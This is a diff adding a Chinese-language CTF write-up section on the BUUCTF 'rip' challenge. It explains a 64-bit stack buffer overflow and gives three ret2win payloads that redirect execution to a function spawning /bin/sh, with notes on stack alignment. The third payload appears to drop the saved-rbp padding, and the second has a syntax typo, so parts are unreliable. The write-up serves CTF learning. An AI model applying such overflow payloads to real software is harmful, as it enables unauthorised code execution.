@@ -170,4 +170,38 @@ io.sendline(payload)
 io.interactive()
 ```
 
+4.一道简单栈溢出的三种做法（BUUCTF rip）
+--
+main函数反编译后很简单，容易观察到存在栈溢出<br>
 
+![image](https://github.com/xhsy0314/Task/assets/84487619/ac28750b-44b4-49d6-abad-370be872f243)
+<br>
+点进变量s，观察到填充的数据为15个<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/eed9c000-ba92-490c-9462-eb348e3c680e)
+<br>
+
+又看到存在system binsh 在fun这个函数里，该函数地址为0x401186<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/9555438b-8c3e-4e90-a040-674f802afd7e)
+<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/2ee861cd-206b-44ff-910c-1e78b228ba43)
+<br>
+**第一种payload：**
+
+```
+payload=b'A'*15+b'B'*8+p64(0x401198)+p64(0x401186)
+#p64(0x401198) 为fun函数的返回地址，加上这个地址是由于64位程序有一个栈对齐的问题
+#另外填充的这8字节是rbp所占的8字节
+```
+![image](https://github.com/xhsy0314/Task/assets/84487619/2cc8f287-aa55-4e69-b79b-d7950899b387)
+<br>
+**第二种payload：**
+```
+payload =b "a" * 23 +p64(0x401187)
+#0x401187是push  rbp 这条指令的下一步，也就不存在栈不对齐的问题了
+```
+
+**第三种payload：**
+```
+payload =b "a" * 15 +p64(0x401186)
+#这应该是最寻常的做法
+```
